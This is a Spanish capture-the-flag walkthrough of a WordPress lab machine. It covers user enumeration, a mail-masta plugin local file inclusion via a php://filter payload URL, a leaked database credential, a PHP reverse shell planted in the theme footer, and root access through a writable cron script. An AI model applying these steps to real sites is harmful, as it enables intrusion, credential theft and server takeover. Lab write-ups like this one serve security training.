Hacemos el reconocimiento con nmap:
![[Pasted image 20230825161735.png]]
![[Pasted image 20230825161755.png]]
En primer lugar revisamos el ftp como anonymous, pero está vacío:
![[Pasted image 20230825161836.png]]
Y esto corre dentro del puerto 80:
![[Pasted image 20230825161941.png]]
Si hacemos fuzzing, encontramos un wordpress:
![[Pasted image 20230825162043.png]]
Y en la web vemos el usuarios elyana:
![[Pasted image 20230825162321.png]]
Y al ser wordpress, también tenemos el wp-login.php:
![[Pasted image 20230825162210.png]]
Si en el panel de login ponemos el usuario elyana, vemos que el mensaje de error cambia, por lo que nos muestra que este usuario existe:
![[Pasted image 20230825162447.png]]
Con esta información, podemos hacer un ataque de fuerza bruta, pero vemos que no encuentra las credenciales:
![[Pasted image 20230825162948.png]]
Por lo que haremos una enumeración de plugins:
```bash
wpscan --url http://10.10.123.20/wordpress/ -e p
```
Y encontramos este que es vulnerable:
![[Pasted image 20230825163230.png]]
Tenemos un script que explota un local file inclusion y podemos leer archivos internos de la máquina:
```bash
https://github.com/p0dalirius/CVE-2016-10956-mail-masta
```
![[Pasted image 20230825163558.png]]
Por tanto lo ejecutamos de la siguiente forma para intentar leer el fichero /etc/passwd:
```bash
python3 CVE-2016-10956_mail_masta.py -t http://10.10.123.20/wordpress/ -f /etc/passwd
```
Y vemos que funciona:
![[Pasted image 20230825163656.png]]
De todos modos, en más webs nos enseñan alternativas para leer archivos internos de la máquina, como ene sta otra de wpscan:
```bash
https://wpscan.com/vulnerability/8609
```
![[Pasted image 20230825164108.png]]
Lo probamos en el navegador y funciona:
![[Pasted image 20230825164125.png]]
Pero si queremos obtener el fichero wp-config.php, tenemos que hacer uso de un wrapper:
```bash
http://10.10.6.206/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=php://filter/convert.base64-encode/resource=../../../../../wp-config.php
```
![[Pasted image 20230826170029.png]]
Esto lo tenemos que decodificar ya que viene en base64:
![[Pasted image 20230826170206.png]]
Y vemos las credenciales del usuario elyana:
```bash
Elyana:H@ckme@123
```
Por tanto iniciamos sesión en el panel de autenticación de wordpress y ya estamos dentro:
![[Pasted image 20230826170551.png]]
Una vez dentro vamos a la parte de theme editor y luego al archivo de footer.php, que tendremos que modificar con un archivo malicioso:
![[Pasted image 20230826170649.png]]
Nos bajamos el php de pentest monkey para enviarnos una reverse shell y lo configuramos de la siguiente forma:
![[Pasted image 20230826170807.png]]
Lo pegamos en el footer.php::
![[Pasted image 20230826170840.png]]
Cargamos la página oficial:
![[Pasted image 20230826171126.png]]
Y recibimos la reverse shell:
![[Pasted image 20230826171137.png]]
Dentro de la máquina, dentro del directorio Elyana, vemos que hay una pista que nos dice que la contraseña está escondida en el sistema y que la encontremos:
![[Pasted image 20230826171304.png]]
Investigando vemos que dentro del /etc/crontab se llama a un script dentro del directorio backups:
![[Pasted image 20230826171524.png]]
Y este es el contenido del script:
![[Pasted image 20230826171555.png]]
Por tanto le añadimos el código para enviarnos una bash como root:
![[Pasted image 20230826171840.png]]
Nos ponemos en escucha con netcat y recibimos la conexión como root:
![[Pasted image 20230826171916.png]]
Ahora, si visualizamos las flags, veremos que están en base64, pero podemos decodificarlas fácilmente y ya las obtenemos:
![[Pasted image 20230826172204.png]]

